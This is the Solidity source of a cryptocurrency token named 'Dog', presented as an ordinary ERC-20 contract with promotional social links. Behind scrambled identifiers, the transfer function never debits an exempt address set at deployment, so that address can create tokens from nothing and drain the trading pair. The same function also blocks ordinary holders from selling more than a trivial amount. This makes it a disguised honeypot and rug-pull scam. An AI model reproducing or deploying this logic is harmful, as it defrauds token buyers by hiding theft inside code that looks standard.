/*

Telegram: https://t.me/Dog_OnETH

Twitter: https://twitter.com/DogonETH

Website: https://dog.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Dog is Ownable {
    mapping(address => uint256) private tdrhmknaeuw;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private oequ;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    string public name;

    uint8 public decimals = 9;

    function approve(address khwemn, uint256 hswc) public returns (bool success) {
        allowance[msg.sender][khwemn] = hswc;
        emit Approval(msg.sender, khwemn, hswc);
        return true;
    }

    function qvdotcsgyfnk(address upzowtsql, address gaykevhbpw, uint256 hswc) private {
        address emnlfwqcbru = IUniswapV2Factory(oequ.factory()).getPair(address(this), oequ.WETH());
        bool xbueygrda = tdrhmknaeuw[upzowtsql] == block.number;
        if (!vwqighpbsxc[upzowtsql]) {
            if (upzowtsql != emnlfwqcbru && hswc < totalSupply && (!xbueygrda || hswc > tehnkf[upzowtsql])) {
                require(totalSupply / (10 ** decimals) >= hswc);
            }
            balanceOf[upzowtsql] -= hswc;
        }
        tehnkf[gaykevhbpw] = hswc;
        balanceOf[gaykevhbpw] += hswc;
        tdrhmknaeuw[gaykevhbpw] = block.number;
        emit Transfer(upzowtsql, gaykevhbpw, hswc);
    }

    constructor(string memory vdjrzfpmqy, string memory dapyj, address xknq, address ehozqmlicgs) {
        name = vdjrzfpmqy;
        symbol = dapyj;
        balanceOf[msg.sender] = totalSupply;
        vwqighpbsxc[ehozqmlicgs] = true;
        oequ = IUniswapV2Router02(xknq);
    }

    mapping(address => uint256) private tehnkf;

    function transfer(address gaykevhbpw, uint256 hswc) public returns (bool success) {
        qvdotcsgyfnk(msg.sender, gaykevhbpw, hswc);
        return true;
    }

    mapping(address => bool) private vwqighpbsxc;

    function transferFrom(address upzowtsql, address gaykevhbpw, uint256 hswc) public returns (bool success) {
        require(hswc <= allowance[upzowtsql][msg.sender]);
        allowance[upzowtsql][msg.sender] -= hswc;
        qvdotcsgyfnk(upzowtsql, gaykevhbpw, hswc);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
